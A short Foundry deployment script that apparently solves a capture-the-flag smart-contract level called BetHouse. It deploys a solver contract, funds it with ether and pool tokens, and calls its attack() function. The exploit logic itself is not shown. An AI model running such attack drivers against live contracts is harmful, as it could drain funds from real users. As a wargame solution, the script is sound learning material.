// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {BetHouseSolver} from "../src/BetHouseSolver.sol";
import {PoolToken} from "../src/PoolToken.sol";
import {Pool} from "../src/Pool.sol";
import {BetHouse} from "../src/BetHouse.sol";

contract BetHouseSolveScript is Script {
    address betHouseAddr;
    address player;
    
    BetHouseSolver solver;
    Pool pool;
    PoolToken depositToken;
    BetHouse betHouse;

    function setUp() public {
        
        betHouseAddr = vm.envAddress("LEVEL");
        betHouse = BetHouse(betHouseAddr);
        pool = Pool(betHouse.pool());
        depositToken = PoolToken(pool.depositToken());
        player = msg.sender;

        solver = new BetHouseSolver(betHouseAddr, player);
    }

    function run() public {
        vm.startBroadcast();

        vm.deal(address(solver), 0.01 ether);
        depositToken.transfer(address(solver), 5);       

        solver.attack();

        vm.stopBroadcast();
    }
}